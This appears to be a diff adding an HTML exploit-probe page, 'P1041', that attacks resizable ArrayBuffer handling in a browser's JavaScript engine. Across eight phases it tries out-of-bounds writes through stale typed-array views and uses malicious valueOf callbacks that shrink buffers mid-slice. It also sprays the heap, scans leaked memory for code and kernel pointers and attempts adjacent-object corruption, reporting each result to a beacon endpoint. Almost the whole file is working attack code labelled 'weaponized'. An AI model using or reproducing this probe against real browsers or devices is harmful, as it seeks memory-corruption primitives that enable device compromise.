@@ -1,0 +1,583 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1041</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#4ec9b0}.fail{color:#f44}.warn{color:#dcdcaa}.hit{color:#c084fc;font-weight:bold}
+</style></head><body><div id="hud"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function log(s){var d=document.getElementById('hud');if(d){var p=document.createElement('div');p.innerHTML=s;d.appendChild(p);d.scrollTop=d.scrollHeight}}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1041-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+function hex(v){return '0x'+v.toString(16)}
+
+log('<b>P1041: RAB OOB Write Verify + Weaponized Slice/Map</b>');
+bn('BOOT','ts='+Date.now().toString(36));
+
+// ===== PHASE A: Verify OOB writes actually land in memory =====
+(function phaseA(){
+  log('[A] Verifying RAB OOB write persistence...');
+  try {
+    var rab = new ArrayBuffer(4096, {maxByteLength: 65536});
+    var ta = new Uint8Array(rab);
+
+    // Fill with pattern
+    for(var i=0;i<4096;i++) ta[i] = 0xBB;
+
+    // Create fixed-offset view at 2048
+    var view2k = new Uint8Array(rab, 2048, 1024);
+    var view3k = new Uint8Array(rab, 3072, 1024);
+
+    // Shrink to 1024 — views at 2048 and 3072 are now OOB
+    rab.resize(1024);
+
+    // Write marker pattern through OOB views
+    var writeResults = [];
+    try {
+      view2k[0] = 0xDE; view2k[1] = 0xAD; view2k[2] = 0xBE; view2k[3] = 0xEF;
+      writeResults.push('v2k_write=ok');
+    } catch(e) { writeResults.push('v2k_write:'+e.name); }
+
+    try {
+      view3k[0] = 0xCA; view3k[1] = 0xFE; view3k[2] = 0xBA; view3k[3] = 0xBE;
+      writeResults.push('v3k_write=ok');
+    } catch(e) { writeResults.push('v3k_write:'+e.name); }
+
+    // GROW BACK to 4096 — do our OOB writes persist?
+    rab.resize(4096);
+    var fresh = new Uint8Array(rab);
+
+    var oob2k = [fresh[2048], fresh[2049], fresh[2050], fresh[2051]];
+    var oob3k = [fresh[3072], fresh[3073], fresh[3074], fresh[3075]];
+
+    // Check if OOB writes persisted
+    var persisted2k = oob2k[0]===0xDE && oob2k[1]===0xAD && oob2k[2]===0xBE && oob2k[3]===0xEF;
+    var persisted3k = oob3k[0]===0xCA && oob3k[1]===0xFE && oob3k[2]===0xBA && oob3k[3]===0xBE;
+    // Were they zeroed instead (spec says new area should be zero)?
+    var zeroed2k = oob2k[0]===0 && oob2k[1]===0 && oob2k[2]===0 && oob2k[3]===0;
+    var zeroed3k = oob3k[0]===0 && oob3k[1]===0 && oob3k[2]===0 && oob3k[3]===0;
+    // Or was the old data still there (0xBB)?
+    var old2k = oob2k[0]===0xBB && oob2k[1]===0xBB && oob2k[2]===0xBB && oob2k[3]===0xBB;
+    var old3k = oob3k[0]===0xBB && oob3k[1]===0xBB && oob3k[2]===0xBB && oob3k[3]===0xBB;
+
+    var result = writeResults.join(',')+
+      '|2k=['+oob2k.map(hex).join(',')+']'+
+      '|3k=['+oob3k.map(hex).join(',')+']'+
+      '|persisted='+(persisted2k?'YES':'no')+'/'+( persisted3k?'YES':'no')+
+      '|zeroed='+(zeroed2k?'yes':'no')+'/'+(zeroed3k?'yes':'no')+
+      '|old='+(old2k?'yes':'no')+'/'+(old3k?'yes':'no');
+
+    bn('A-WRITE', result);
+    log('[A] OOB write verify: '+result);
+
+    if(persisted2k || persisted3k) {
+      log('<span class="hit">[A] OOB WRITES PERSISTED! This is a WRITE primitive!</span>');
+    } else if(zeroed2k && zeroed3k) {
+      log('[A] <span class="warn">Writes silently dropped — grow zeroes the area</span>');
+    } else if(old2k && old3k) {
+      log('[A] <span class="warn">Old data preserved — writes silently dropped, resize keeps data</span>');
+    }
+
+  } catch(e) {
+    bn('A-ERR', e.name+':'+e.message);
+    log('[A] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE B: Slice OOB — what data is in the extra bytes? =====
+(function phaseB(){
+  log('[B] Slice OOB data analysis...');
+  try {
+    // Create RAB, fill with known pattern, shrink, then slice
+    var rab = new ArrayBuffer(8192, {maxByteLength: 65536});
+    var ta = new Uint8Array(rab);
+
+    // Fill with unique pattern at each offset
+    for(var i=0;i<8192;i++) ta[i] = (i * 7 + 13) & 0xFF;
+
+    // Create evil valueOf that shrinks during slice
+    var evil = {
+      valueOf: function() {
+        try { rab.resize(256); } catch(e){}
+        return 0;
+      }
+    };
+
+    var sliced = rab.slice(evil, 8192);
+    var sv = new Uint8Array(sliced);
+
+    // Check what's in the slice past 256
+    var firstNonZero = -1;
+    var matchesOriginal = 0;
+    var zeros = 0;
+    var unexpected = 0;
+
+    for(var i=256;i<sliced.byteLength;i++) {
+      var expected = (i * 7 + 13) & 0xFF; // Original pattern
+      if(sv[i] === 0) {
+        zeros++;
+      } else if(sv[i] === expected) {
+        matchesOriginal++;
+        if(firstNonZero < 0) firstNonZero = i;
+      } else {
+        unexpected++;
+        if(firstNonZero < 0) firstNonZero = i;
+      }
+    }
+
+    var result = 'len='+sliced.byteLength+'|first256ok='+(sv[0]===(13&0xFF)?'yes':'no')+
+      '|zeros='+zeros+'|matches_orig='+matchesOriginal+'|unexpected='+unexpected+
+      '|first_nonzero='+firstNonZero;
+
+    bn('B-SLICE', result);
+    log('[B] Slice data: '+result);
+
+    if(matchesOriginal > 0) {
+      log('<span class="hit">[B] Slice reads ORIGINAL data past shrunken boundary!</span>');
+    }
+    if(unexpected > 0) {
+      log('<span class="hit">[B] Slice reads UNKNOWN data past boundary — possible heap leak!</span>');
+      // Dump first few unexpected bytes
+      var dump = [];
+      for(var i=256;i<Math.min(sliced.byteLength,1024);i++) {
+        var expected = (i * 7 + 13) & 0xFF;
+        if(sv[i] !== expected && sv[i] !== 0) {
+          dump.push(i+':'+hex(sv[i])+'(exp:'+hex(expected)+')');
+        }
+      }
+      bn('B-DUMP', dump.slice(0,30).join(','));
+    }
+
+  } catch(e) {
+    bn('B-ERR', e.name+':'+e.message);
+    log('[B] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE C: Map OOB with heap spray =====
+(function phaseC(){
+  log('[C] Map OOB with pre-spray...');
+  try {
+    // Step 1: Spray many objects to fill heap
+    var sprayStrings = [];
+    var marker = 'KRNL_' + Math.random().toString(36);
+    for(var i=0;i<5000;i++) {
+      sprayStrings.push(marker + '_' + i + '_' + 'A'.repeat(100));
+    }
+
+    // Step 2: Create RAB
+    var rab = new ArrayBuffer(16384, {maxByteLength: 65536});
+    var ta = new Uint8Array(rab);
+    for(var i=0;i<16384;i++) ta[i] = 0xDD;
+
+    // Step 3: Free the strings to create holes
+    var kept = sprayStrings.slice(0, 10); // Keep a few references
+    sprayStrings = null;
+    // Try to trigger GC
+    for(var i=0;i<100;i++) { var tmp = new ArrayBuffer(65536); }
+
+    // Step 4: Map with resize — see if freed string data appears
+    var resized = false;
+    var oobVals = [];
+    var uniqueOob = {};
+
+    ta.map(function(val, idx) {
+      if(idx === 1000 && !resized) {
+        resized = true;
+        try { rab.resize(512); } catch(e){}
+      }
+      if(idx >= 512 && idx < 2048 && resized) {
+        if(val !== 0 && val !== 0xDD) {
+          oobVals.push(idx + ':' + hex(val));
+          uniqueOob[val] = (uniqueOob[val] || 0) + 1;
+        }
+      }
+      return val;
+    });
+
+    var result = 'oob_count='+oobVals.length+
+      '|unique='+Object.keys(uniqueOob).length+
+      '|sample='+oobVals.slice(0,10).join(',');
+
+    bn('C-MAP', result);
+    log('[C] Map OOB spray: '+result);
+
+    if(oobVals.length > 0) {
+      var allDD = oobVals.every(function(v){ return v.indexOf('0xdd') >= 0; });
+      if(allDD) {
+        log('[C] <span class="warn">OOB reads are original 0xDD — RAB keeps memory reserved</span>');
+      } else {
+        log('<span class="hit">[C] NEW DATA in OOB region — heap data leak!</span>');
+      }
+    }
+
+  } catch(e) {
+    bn('C-ERR', e.name+':'+e.message);
+    log('[C] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE D: BigUint64Array slice OOB for pointer extraction =====
+(function phaseD(){
+  log('[D] BigUint64Array slice OOB pointer extraction...');
+  try {
+    var rab = new ArrayBuffer(8192, {maxByteLength: 65536});
+    var fill = new Uint8Array(rab);
+    for(var i=0;i<8192;i++) fill[i] = 0;
+
+    // Create BigUint64Array view
+    var big = new BigUint64Array(rab);
+
+    // Fill with marker via BigUint64
+    for(var i=0;i<big.length;i++) big[i] = BigInt(i);
+
+    // Slice with valueOf resize
+    var evil = {
+      valueOf: function() {
+        try { rab.resize(64); } catch(e){}
+        return 0;
+      }
+    };
+
+    var sliced;
+    try {
+      sliced = rab.slice(evil, 8192);
+    } catch(e) {
+      bn('D-ERR1', e.name);
+      log('[D] slice error: '+e.name);
+      return;
+    }
+
+    if(!sliced || sliced.byteLength <= 64) {
+      bn('D-SMALL', 'len='+( sliced?sliced.byteLength:0));
+      log('[D] Slice too small');
+      return;
+    }
+
+    // Read as BigUint64Array
+    var bigSlice = new BigUint64Array(sliced);
+    var ptrs = [];
+
+    for(var i = 8; i < bigSlice.length; i++) { // Skip first 64 bytes (still valid)
+      var val = bigSlice[i];
+      if(val === 0n) continue;
+
+      // Extract hi/lo
+      var hi = Number(val >> 32n);
+      var lo = Number(val & 0xFFFFFFFFn);
+
+      // Code pointers: 0x01-0x07
+      if(hi >= 1 && hi <= 7 && lo > 0x1000) {
+        ptrs.push({type:'code', off:i*8, hi:hi, lo:lo});
+      }
+      // Vtable: 0x081B-0x087F
+      if(hi >= 0x081B && hi <= 0x087F) {
+        ptrs.push({type:'vt', off:i*8, hi:hi, lo:lo});
+      }
+      // Heap: 0x0880+
+      if(hi >= 0x0880 && hi <= 0x088F) {
+        ptrs.push({type:'heap', off:i*8, hi:hi, lo:lo});
+      }
+      // Kernel: 0xFFFF8xxx
+      if((hi & 0xFFFF8000) === 0xFFFF8000 && hi !== 0xFFFFFFFF) {
+        ptrs.push({type:'KERN', off:i*8, hi:hi, lo:lo});
+      }
+    }
+
+    var nonZeroCount = 0;
+    for(var i = 8; i < bigSlice.length; i++) {
+      if(bigSlice[i] !== 0n) nonZeroCount++;
+    }
+
+    var result = 'len='+sliced.byteLength+'|nonzero='+nonZeroCount+'|ptrs='+ptrs.length;
+    if(ptrs.length > 0) {
+      result += '|first='+ptrs[0].type+':0x'+ptrs[0].hi.toString(16)+ptrs[0].lo.toString(16).padStart(8,'0');
+    }
+    bn('D-PTRS', result);
+    log('[D] BigUint64 slice: '+result);
+
+    if(ptrs.filter(function(p){return p.type==='KERN'}).length > 0) {
+      log('<span class="hit">[D] KERNEL POINTER IN SLICE OOB!</span>');
+      var kp = ptrs.filter(function(p){return p.type==='KERN'});
+      bn('D-KERN', kp.slice(0,5).map(function(p){return p.off+':0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0')}).join('|'));
+    }
+    if(ptrs.filter(function(p){return p.type==='code'}).length > 0) {
+      log('<span class="hit">[D] CODE POINTER IN SLICE OOB!</span>');
+    }
+
+  } catch(e) {
+    bn('D-ERR', e.name+':'+e.message);
+    log('[D] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE E: OOB write → Adjacent object corruption test =====
+(function phaseE(){
+  log('[E] Adjacent object corruption via OOB TypedArray write...');
+  try {
+    // Strategy: create two RABs adjacent in memory, write OOB from first into second
+    var results = [];
+
+    for(var trial = 0; trial < 50; trial++) {
+      // Allocate many RABs to fill heap, hoping two end up adjacent
+      var rabs = [];
+      var views = [];
+      for(var i=0;i<20;i++) {
+        var r = new ArrayBuffer(256, {maxByteLength: 256});
+        var v = new Uint8Array(r);
+        for(var j=0;j<256;j++) v[j] = i; // Fill with index value
+        rabs.push(r);
+        views.push(v);
+      }
+
+      // Create one more RAB with larger maxByteLength
+      var target = new ArrayBuffer(256, {maxByteLength: 4096});
+      var targetView = new Uint8Array(target);
+      for(var j=0;j<256;j++) targetView[j] = 0xFF;
+
+      // Create a view at offset 0, length 256
+      var writeView = new Uint8Array(target, 0, 256);
+
+      // Shrink target to 64 bytes
+      target.resize(64);
+
+      // Write at OOB position through the stale view
+      try {
+        for(var j=64;j<256;j++) writeView[j] = 0x41; // 'A'
+      } catch(e) {}
+
+      // Check if any of our other RABs got corrupted
+      for(var i=0;i<20;i++) {
+        var v = new Uint8Array(rabs[i]);
+        for(var j=0;j<256;j++) {
+          if(v[j] !== i && v[j] === 0x41) {
+            results.push(trial+':rab'+i+'['+j+']=0x41');
+            break;
+          }
+        }
+      }
+    }
+
+    var eResult = 'corrupted='+results.length+'|'+results.slice(0,10).join(',');
+    bn('E-CORRUPT', eResult);
+    log('[E] Adjacent corruption: '+eResult);
+
+    if(results.length > 0) {
+      log('<span class="hit">[E] ADJACENT OBJECT CORRUPTED VIA OOB WRITE!</span>');
+    } else {
+      log('[E] <span class="warn">No cross-object corruption detected (writes stay within maxByteLength)</span>');
+    }
+
+  } catch(e) {
+    bn('E-ERR', e.name+':'+e.message);
+    log('[E] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE F: Slice OOB after GC pressure =====
+(function phaseF(){
+  log('[F] Slice OOB after heavy GC pressure...');
+  try {
+    // 1. Create RAB
+    var rab = new ArrayBuffer(16384, {maxByteLength: 65536});
+    var ta = new Uint8Array(rab);
+    for(var i=0;i<16384;i++) ta[i] = 0xEE;
+
+    // 2. Shrink to minimal
+    rab.resize(64);
+
+    // 3. Allocate LOTS of objects to pressure GC and potentially reclaim the freed pages
+    var junk = [];
+    for(var round=0;round<3;round++) {
+      for(var i=0;i<10000;i++) {
+        junk.push(new ArrayBuffer(256));
+        junk.push({a: i, b: 'test'+i, c: new Float64Array(4)});
+      }
+      // Try to trigger GC
+      junk = junk.slice(-100);
+    }
+
+    // 4. Now slice with OOB — if pages were reclaimed and reused, we see foreign data
+    var evil = { valueOf: function() { return 0; } }; // RAB already shrunk
+    var sliced;
+    try {
+      sliced = rab.slice(0, 65536); // Ask for up to maxByteLength
+    } catch(e) {
+      // Might throw if buffer is truly only 64 bytes
+      bn('F-THROW', e.name+'|'+e.message.slice(0,100));
+      log('[F] slice threw: '+e.name);
+      return;
+    }
+
+    var sv = new Uint8Array(sliced);
+    var analysis = {zeroes:0, ees:0, other:0, unique:{}};
+
+    for(var i=64;i<sliced.byteLength;i++) {
+      if(sv[i] === 0) analysis.zeroes++;
+      else if(sv[i] === 0xEE) analysis.ees++;
+      else {
+        analysis.other++;
+        analysis.unique[sv[i]] = (analysis.unique[sv[i]]||0)+1;
+      }
+    }
+
+    var result = 'len='+sliced.byteLength+
+      '|zeros='+analysis.zeroes+
+      '|ees='+analysis.ees+
+      '|other='+analysis.other+
+      '|unique='+Object.keys(analysis.unique).length;
+
+    bn('F-GC', result);
+    log('[F] Post-GC slice: '+result);
+
+    if(analysis.other > 0) {
+      log('<span class="hit">[F] FOREIGN DATA in post-GC slice! '+analysis.other+' unexpected bytes!</span>');
+      // Dump top values
+      var top = Object.entries(analysis.unique).sort(function(a,b){return b[1]-a[1]}).slice(0,10);
+      bn('F-TOP', top.map(function(e){return hex(Number(e[0]))+'='+e[1]}).join(','));
+    }
+
+  } catch(e) {
+    bn('F-ERR', e.name+':'+e.message);
+    log('[F] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE G: TypedArray subarray + RAB resize =====
+(function phaseG(){
+  log('[G] TypedArray.subarray + RAB resize...');
+  try {
+    var rab = new ArrayBuffer(4096, {maxByteLength: 65536});
+    var ta = new Uint8Array(rab);
+    for(var i=0;i<4096;i++) ta[i] = (i & 0xFF);
+
+    // Create subarray covering full buffer
+    var sub = ta.subarray(0, 4096);
+
+    // Shrink buffer
+    rab.resize(128);
+
+    // Try reading from subarray past shrunken boundary
+    var oobReads = [];
+    try {
+      // subarray should track the RAB
+      for(var i=128;i<256;i+=32) {
+        var val = sub[i];
+        oobReads.push(i+':'+( val===undefined?'undef':hex(val)));
+      }
+    } catch(e) {
+      oobReads.push('err:'+e.name);
+    }
+
+    // Check subarray.length — does it update?
+    var subLen = sub.length;
+    var subByteLen = sub.byteLength;
+
+    var result = 'sub_len='+subLen+'|sub_bytelen='+subByteLen+'|reads='+oobReads.join(',');
+    bn('G-SUB', result);
+    log('[G] Subarray: '+result);
+
+    if(subLen > 128) {
+      log('<span class="hit">[G] Subarray length NOT updated after resize!</span>');
+    }
+
+    // Try writing through subarray
+    var writeOk = [];
+    try { sub[200] = 0xAB; writeOk.push('200=ok'); } catch(e) { writeOk.push('200:'+e.name); }
+    try { sub[500] = 0xCD; writeOk.push('500=ok'); } catch(e) { writeOk.push('500:'+e.name); }
+
+    bn('G-WRITE', writeOk.join('|'));
+    log('[G] Subarray write OOB: '+writeOk.join(' | '));
+
+  } catch(e) {
+    bn('G-ERR', e.name+':'+e.message);
+    log('[G] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE H: Concurrent Worker resize + read =====
+(function phaseH(){
+  log('[H] Shared RAB + Worker concurrent access...');
+  try {
+    // Check if SAB exists (we know it doesn't, but RAB might work with workers differently)
+    if(typeof Worker === 'undefined') {
+      bn('H-SKIP', 'no_workers');
+      return;
+    }
+
+    // Test: send RAB to worker, resize in main thread
+    var workerCode = [
+      'self.onmessage=function(e){',
+      '  var buf=e.data.buf;',
+      '  var results=[];',
+      '  try{',
+      '    var v=new Uint8Array(buf);',
+      '    results.push("len="+v.length);',
+      '    results.push("byte="+v.byteLength);',
+      '    // Read in tight loop',
+      '    var reads=[];',
+      '    for(var i=0;i<1000;i++){',
+      '      try{var x=v[v.length-1];reads.push(x)}catch(err){reads.push(-1)}',
+      '    }',
+      '    var unique={};for(var i=0;i<reads.length;i++)unique[reads[i]]=(unique[reads[i]]||0)+1;',
+      '    results.push("unique="+Object.keys(unique).length);',
+      '    results.push("vals="+Object.keys(unique).join(","));',
+      '  }catch(err){results.push("err="+err.name)}',
+      '  self.postMessage(results.join("|"));',
+      '};'
+    ].join('\n');
+
+    var blob = new Blob([workerCode], {type:'application/javascript'});
+    var url = URL.createObjectURL(blob);
+    var w = new Worker(url);
+
+    var rab = new ArrayBuffer(4096, {maxByteLength: 65536});
+    var ta = new Uint8Array(rab);
+    for(var i=0;i<4096;i++) ta[i] = 0x42;
+
+    w.onmessage = function(e) {
+      bn('H-RESULT', e.data);
+      log('[H] Worker result: '+e.data);
+      w.terminate();
+      URL.revokeObjectURL(url);
+
+      // Continue to final beacon
+      finish();
+    };
+    w.onerror = function(e) {
+      bn('H-ERR', 'worker_error');
+      log('[H] Worker error');
+      w.terminate();
+      finish();
+    };
+
+    // Send RAB to worker (non-transfer, shared view if possible)
+    try {
+      w.postMessage({buf: rab});
+      // Immediately resize in main thread
+      setTimeout(function(){
+        try { rab.resize(64); } catch(e){}
+      }, 0);
+    } catch(e) {
+      bn('H-SEND', 'err:'+e.name);
+      w.terminate();
+      finish();
+    }
+
+  } catch(e) {
+    bn('H-ERR', e.name+':'+e.message);
+    log('[H] Error: '+e.message);
+    finish();
+  }
+})();
+
+function finish() {
+  bn('DONE', 'write_verify+slice_data+map_spray+big64+corrupt+gc+subarray+worker');
+  log('<b>[DONE] All P1041 phases complete</b>');
+}
+</script></body></html>
